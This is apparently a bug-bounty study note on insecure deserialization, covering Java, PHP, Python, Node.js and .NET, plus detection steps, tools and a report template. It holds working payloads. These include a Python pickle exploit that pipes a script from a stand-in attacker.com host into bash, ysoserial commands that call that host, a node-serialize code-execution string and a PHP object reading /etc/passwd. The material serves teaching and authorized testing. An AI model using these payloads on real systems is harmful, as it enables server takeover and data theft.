# Insecure Deserialization

> **OWASP:** A08:2021  
> **Severity:** High → Critical (often leads to RCE)  
> **Bounty Range:** $1,000 – $50,000+ (RCE = max payout)  
> **Why it matters:** One of the most dangerous bugs — can give full server control

---

## What is Insecure Deserialization?

Serialization = converting an object (user, session, cart) into a storable format (JSON, XML, binary).  
Deserialization = converting it back into an object.

**The bug:** App deserializes data from the user **without validating it first**. Attacker crafts a malicious serialized payload → server executes it on deserialization → RCE, auth bypass, privilege escalation.

```
Normal flow:
User object → serialize → store in cookie → send to server → deserialize → use object

Attack flow:
Malicious payload → craft serialized object → send in cookie/param → server deserializes → RCE!
```

---

## Where to Look

```
Cookies:          Base64 blobs in cookie values
Hidden fields:    <input type="hidden" value="rO0AB...">
API parameters:   JSON/XML body fields
Cache headers:    X-Cache-Token, X-Session-Data
ViewState:        ASP.NET __VIEWSTATE parameter
Remember-me:      Persistent login tokens
```

---

## Language-Specific Attacks

### Java — Most Common (ysoserial)
```bash
# Identify Java serialized data:
# Starts with: rO0AB (Base64) or AC ED 00 05 (hex)

# Generate payload with ysoserial
java -jar ysoserial.jar CommonsCollections6 'curl attacker.com' | base64

# Common gadget chains:
CommonsCollections1-7   # Apache Commons — most common
Spring1                 # Spring Framework
Hibernate1              # Hibernate ORM
URLDNS                  # Safe — just triggers DNS (use for detection)

# Detection (safe — just pings your server):
java -jar ysoserial.jar URLDNS 'http://yourburpcollaborator.net' | base64
# If you get a DNS hit → deserialization is happening!
```

### PHP — Object Injection
```php
# PHP serialized data looks like:
# O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:4:"user";}

# Attack: manipulate the object
# Original cookie: O:4:"User":1:{s:4:"role";s:4:"user";}
# Modified:        O:4:"User":1:{s:4:"role";s:5:"admin";}

# Magic methods abused:
__wakeup()    # called on deserialization
__destruct()  # called when object destroyed
__toString()  # called when object used as string

# If class has __wakeup() that reads files:
O:8:"FileRead":1:{s:4:"path";s:11:"/etc/passwd";}
```

### Python — Pickle RCE
```python
# Python pickle is dangerous — never deserialize untrusted data
import pickle, os, base64

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('curl http://attacker.com/shell.sh | bash',))

payload = base64.b64encode(pickle.dumps(Exploit()))
# Send this as cookie/parameter value
```

### Node.js — node-serialize
```javascript
// Vulnerable pattern: node-serialize package
// IIFE (Immediately Invoked Function Expression) in JSON:
{
  "rce": "_$$ND_FUNC$$_function(){require('child_process').exec('id');}()"
}
// The () at the end executes it on deserialization!
```

### .NET — ViewState / BinaryFormatter
```
# ASP.NET ViewState without MAC validation
# Decode: base64 → gunzip → manipulate → gzip → base64

# Tool: ysoserial.net
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "calc.exe"

# Check if ViewState is protected:
# No __VIEWSTATEGENERATOR = MAC not validated = vulnerable
```

---

## Detection Methodology

### Step 1 — Find Serialized Data
```bash
# Look for these patterns in all requests:
rO0AB          # Java (Base64)
AC ED 00 05    # Java (hex)
O:             # PHP
{"rce":        # Node.js node-serialize
__VIEWSTATE    # .NET
\x80\x04       # Python pickle (hex)
```

### Step 2 — Safe Detection (No Impact)
```bash
# Java: URLDNS gadget — only makes DNS request, no harm
java -jar ysoserial.jar URLDNS 'http://PAYLOAD.burpcollaborator.net' | base64 -w0

# Replace original serialized value with this payload
# Check Burp Collaborator for DNS hit
# DNS hit = deserialization confirmed!
```

### Step 3 — Escalate Carefully
```bash
# Only escalate to RCE after confirming deserialization
# Use sleep/ping commands to confirm execution without harm:
java -jar ysoserial.jar CommonsCollections6 'ping -c 1 attacker.com' | base64 -w0

# If you get ICMP hits = confirmed RCE!
```

---

## Common Real-World Targets

| Target | Where | Gadget |
|--------|-------|--------|
| Jenkins | /cli endpoint, cookies | CommonsCollections |
| WebLogic | T3 protocol, HTTP | CommonsCollections, Spring |
| JBoss | /invoker/JMXInvokerServlet | CommonsCollections |
| Apache Struts | Content-Type header | — |
| PHP apps | Cookie, session, hidden fields | Custom magic methods |
| Node.js apps | JSON body params | node-serialize IIFE |

---

## Tools

```bash
# ysoserial — Java deserialization payloads
https://github.com/frohoff/ysoserial

# ysoserial.net — .NET payloads
https://github.com/pwntester/ysoserial.net

# PHPGGC — PHP gadget chains
https://github.com/ambionics/phpggc
phpggc Laravel/RCE1 system id

# Burp Suite Extensions:
# - Java Deserialization Scanner
# - Freddy (detects Java/PHP/.NET deserialization)
```

---

## Checklist

```
☐  Check all cookies for Base64 blobs starting with rO0AB (Java)
☐  Look for PHP serialized strings: O:number:"ClassName"
☐  Check hidden form fields for serialized data
☐  Test .NET __VIEWSTATE — is MAC validation enabled?
☐  Use ysoserial URLDNS gadget for safe detection (DNS only)
☐  Check Burp Collaborator for DNS/HTTP hits after payload
☐  Search for node-serialize in JS app dependencies
☐  Test remember-me / persistent login tokens
```

---

## Impact Chain

```
Insecure Deserialization
    ↓
Remote Code Execution (RCE)
    ↓
Full server compromise
    ↓
Internal network pivot
    ↓
Database dump + all user data
    ↓
Complete infrastructure takeover
```

---

## Report Template

```
Title: Insecure Java Deserialization — Remote Code Execution

Severity: Critical (CVSS 9.8)

Endpoint: POST /api/session  (cookie: session=rO0AB...)

Steps to Reproduce:
1. Intercept any request containing serialized Java object in cookie
2. Generate payload: java -jar ysoserial.jar CommonsCollections6 'ping attacker.com'
3. Base64 encode and replace cookie value
4. Observe ICMP requests to attacker.com = confirmed RCE

Proof: [Burp Collaborator screenshot showing DNS/ICMP hits]

Impact:
Full remote code execution on the server. Attacker can read
all files, dump the database, pivot to internal network,
and establish persistent backdoor access.

Remediation:
- Never deserialize untrusted user input
- Use JSON/XML instead of native serialization
- Implement integrity checks (HMAC) on serialized data
- Apply deserialization filters (Java: ObjectInputFilter)
```

---

## Practice Labs

- [PortSwigger Deserialization Labs](https://portswigger.net/web-security/deserialization) — 10 free labs
- [InsecureLabs](https://github.com/insecure-deserialization/labs)
- [HackTheBox — Serialized machines]

---

*Daily Bug Bounty notes — follow for more.*
